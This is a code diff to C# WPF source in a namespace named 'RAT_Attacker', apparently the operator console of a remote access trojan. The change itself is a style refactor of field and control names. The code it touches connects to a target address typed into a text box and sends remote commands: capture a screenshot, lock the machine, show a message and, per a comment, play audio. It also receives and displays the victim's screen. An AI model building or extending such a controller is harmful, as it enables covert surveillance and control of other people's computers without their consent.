@@ -12,10 +12,10 @@ namespace RAT_Attacker
      * play audio
      */
 
-    public partial class MainWindow : Window
+    public partial class MainWindow
     {
-        Socket client;
-        Encoding encoding = Encoding.GetEncoding(1251);
+        private Socket _client;
+        private static readonly Encoding CommandEncoding = Encoding.GetEncoding(1251);
         
         public MainWindow()
         {
@@ -24,11 +24,11 @@ namespace RAT_Attacker
 
         private void SendCommand(string command)
         {
-            client = new Socket(SocketType.Stream, ProtocolType.Tcp);
+            _client = new Socket(SocketType.Stream, ProtocolType.Tcp);
             try
             {
-                client.Connect(new IPEndPoint(IPAddress.Parse(addressTextBox.Text), 80));
-                client.Send(encoding.GetBytes(command));
+                _client.Connect(new IPEndPoint(IPAddress.Parse(AddressTextBox.Text), 80));
+                _client.Send(CommandEncoding.GetBytes(command));
             }
             catch (SocketException ex)
             {
@@ -54,14 +54,14 @@ namespace RAT_Attacker
             SendCommand("TakeScreenshot");
 
             byte[] buffer = new byte[128_000];
-            client.Receive(buffer);
+            _client.Receive(buffer);
 
             BitmapImage bitmapImage = new BitmapImage();
             bitmapImage.BeginInit();
             bitmapImage.StreamSource = new MemoryStream(buffer);
             bitmapImage.EndInit();
 
-            image.Source = bitmapImage;
+            ScreenshotImage.Source = bitmapImage;
         }
 
         private void Lock(object sender, RoutedEventArgs e)
@@ -76,11 +76,11 @@ namespace RAT_Attacker
 
         private void SendMessage(object sender, RoutedEventArgs e)
         {
-            string trimmedText = messageTextBox.Text.Trim(' ');
+            string trimmedText = MessageTextBox.Text.Trim(' ');
             if (trimmedText != "")
             {
                 SendCommand("Message: " + trimmedText);
-                messageTextBox.Clear();
+                MessageTextBox.Clear();
             }
         }
 
